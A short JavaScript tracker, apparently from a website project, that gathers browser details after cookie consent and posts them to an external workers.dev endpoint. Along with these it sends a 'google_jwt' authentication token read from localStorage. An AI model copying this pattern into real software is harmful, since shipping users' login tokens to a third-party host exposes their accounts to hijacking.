function sendTracker() {
	const data = {
		userAgent: navigator.userAgent,
		language: navigator.language,
		platform: navigator.platform,
		timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
		cookiesEnabled: navigator.cookieEnabled,
		google_jwt: localStorage.getItem("google_jwt") || null
	};

	fetch("https://tfg-tracker.alexgaro2015.workers.dev", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(data)
	})
		.then(res => console.log("Tracker OK:", res.status))
		.catch(err => console.error("Tracker error:", err));
}

if (localStorage.getItem("cookies-accepted") === "true") {
	sendTracker();
}